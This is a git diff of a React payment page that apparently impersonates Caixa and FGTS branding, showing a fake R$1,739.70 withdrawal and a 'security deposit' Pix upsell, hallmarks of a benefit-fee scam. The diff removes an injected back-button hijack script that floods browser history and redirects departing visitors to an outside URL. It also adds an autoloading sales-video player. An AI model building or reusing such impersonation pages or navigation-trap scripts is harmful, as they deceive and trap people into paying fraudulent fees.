@@ -2,12 +2,13 @@ import { useEffect, useState } from "react";
 import logo from "../assets/caixalogo.png";
 import logofgts from "../assets/fgts2.png";
 import { IoIosWarning, IoMdCheckmarkCircle } from "react-icons/io";
+import { Helmet } from "react-helmet";
 import { UserData } from "../types/userData";
 import pix from "../assets/pix.png";
 
 export function PagamentoUpsell() {
     const [displayedAmount, setDisplayedAmount] = useState(0);
-    const saqueTotal = 1739.70;
+    const saqueTotal = 1739.70; // Valor do saque disponível
 
     const [, setIsVisible] = useState(false);
 
@@ -69,6 +70,7 @@ export function PagamentoUpsell() {
         }
     }, []);
 
+    // Animação do valor do saque
     useEffect(() => {
         const interval = setInterval(() => {
             setDisplayedAmount((prev) => (prev < saqueTotal ? prev + 50 : saqueTotal));
@@ -76,42 +78,12 @@ export function PagamentoUpsell() {
         return () => clearInterval(interval);
     }, [saqueTotal]);
 
-    // Adiciona o script de redirecionamento
-    useEffect(() => {
-        const head = document.querySelector("head");
-        if (head) {
-            const scriptEl = document.createElement("script");
-            scriptEl.innerHTML = `
-                const link = 'https://meubackredirect.com.br/backredirect';
-                function setBackRedirect(url) {
-                    let urlBackRedirect = url;
-                    urlBackRedirect = urlBackRedirect.trim() +
-                        (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
-                        document.location.search.replace('?', '').toString();
-
-                    history.pushState({}, '', location.href);
-                    history.pushState({}, '', location.href);
-                    history.pushState({}, '', location.href);
-
-                    window.addEventListener('popstate', () => {
-                        console.log('onpopstate', urlBackRedirect);
-                        setTimeout(() => {
-                            location.href = urlBackRedirect;
-                        }, 1);
-                    });
-                }
-                setBackRedirect(link);
-            `;
-            head.appendChild(scriptEl);
-
-            return () => {
-                head.removeChild(scriptEl);
-            };
-        }
-    }, []);
-
     return (
         <div className="min-h-screen flex flex-col items-center bg-gray-50 text-gray-900">
+            <Helmet>
+                <title>Verificação de Segurança - Calção</title>
+            </Helmet>
+
             {/* Cabeçalho com logotipo, saudação e logo FGTS */}
             <header className="flex w-full flex-col p-6 space-y-4 bg-[#025bab] shadow-lg">
                 <div className="flex items-center justify-between w-full">
@@ -150,9 +122,12 @@ export function PagamentoUpsell() {
                         ENTENDA O CALÇÃO DE SEGURANÇA
                     </h2>
 
-                    {/* Video embed */}
-                    <div className="w-full py-4">
+
+                    <div className="w-full  py-4">
                         <div dangerouslySetInnerHTML={{ __html: '<div id="vid_673562a42eb080000b6d0a99" style="position: relative; width: 100%; padding: 56.25% 0 0;"> <img id="thumb_673562a42eb080000b6d0a99" src="https://images.converteai.net/e5cc2817-09a8-45cb-a70b-789a99211f8a/players/673562a42eb080000b6d0a99/thumbnail.jpg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: block;" alt="thumbnail"> <div id="backdrop_673562a42eb080000b6d0a99" style=" -webkit-backdrop-filter: blur(5px); backdrop-filter: blur(5px); position: absolute; top: 0; height: 100%; width: 100%; "></div> </div> ' }} />
+                        <Helmet>
+                            <script type="text/javascript" id="scr_673562a42eb080000b6d0a99"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/e5cc2817-09a8-45cb-a70b-789a99211f8a/players/673562a42eb080000b6d0a99/player.js", s.async=!0,document.head.appendChild(s); </script>
+                        </Helmet>
                     </div>
 
                     <p className="text-lg text-gray-600 mb-4">
